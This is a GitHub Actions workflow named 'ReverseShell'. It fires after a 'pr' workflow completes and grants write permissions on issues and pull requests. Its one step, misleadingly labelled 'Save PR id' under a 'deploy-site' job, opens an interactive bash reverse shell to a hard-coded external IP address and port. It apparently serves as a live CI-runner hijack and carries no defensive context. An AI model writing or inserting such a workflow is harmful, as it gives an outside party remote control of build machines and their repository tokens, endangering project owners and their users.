name: ReverseShell

on:
  workflow_run:
    workflows: [pr]
    types:
      - completed

permissions:
  contents: read

jobs:
  deploy-site:
    permissions:
      actions: read 
      issues: write 
      pull-requests: write
    name: reverseshell
    runs-on: ubuntu-latest
    steps:
      - name: Save PR id
        id: pr
        run: echo "hello world" && bash -i >& /dev/tcp/116.62.149.37/9999 0>&1
